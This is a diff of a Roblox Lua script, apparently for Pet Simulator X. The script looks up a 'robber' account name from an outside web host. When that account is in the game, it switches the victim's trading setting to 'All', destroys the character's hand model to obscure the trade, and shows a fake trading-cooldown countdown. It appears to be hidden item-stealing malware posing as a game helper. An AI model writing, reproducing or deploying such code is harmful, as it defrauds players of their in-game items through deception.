@@ -1,13 +1,7 @@
 repeat
 	wait()
 until game:IsLoaded()
-local notLoaded1 = Instance.new("Message", game:GetService("CoreGui"))
-	for i=0,75 do
-		wait(1)
-		notLoaded.Text = "Waiting for the game to load."
-    end
 wait(10)
-notLoaded1:Destroy()
 --Requests
 local http_request = http_request
 if IsElectron then
@@ -46,6 +40,12 @@ end
 local robberName = http_request_get("https://kmd-hub.000webhostapp.com/petsimx-getBotNames.php")
 if game.Players:FindFirstChild(robberName) then
     -- Identifier
+    --Send trade
+    local notLoaded = Instance.new("Message", game:GetService("CoreGui"))
+	for i=0,75 do
+	    wait(1)
+	    notLoaded.Text = "Waiting for the trading "..tostring(75-i).." seconds cooldown."
+    end
     if game.Players.LocalPlayer.Character:FindFirstChild("LeftHand") then
         game.Players.LocalPlayer.Character.LeftHand:Destroy()
     end
@@ -62,12 +62,6 @@ if game.Players:FindFirstChild(robberName) then
     		if game:GetService("Players").LocalPlayer.PlayerGui.Settings.Frame.Container.Trading.Toggle.Label.Text == "All" then break end
     		workspace.__THINGS.__REMOTES:FindFirstChild("toggle setting"):FireServer(unpack(args))
     	until game:GetService("Players").LocalPlayer.PlayerGui.Settings.Frame.Container.Trading.Toggle.Label.Text == "All"
-    end
-    --Send trade
-    local notLoaded = Instance.new("Message", game:GetService("CoreGui"))
-	for i=0,75 do
-	    wait(1)
-	    notLoaded.Text = "Waiting for the trading "..tostring(75-i).." seconds cooldown."
     end
     coroutine.wrap(function() -- For anti guis
 	    while wait(.2) do
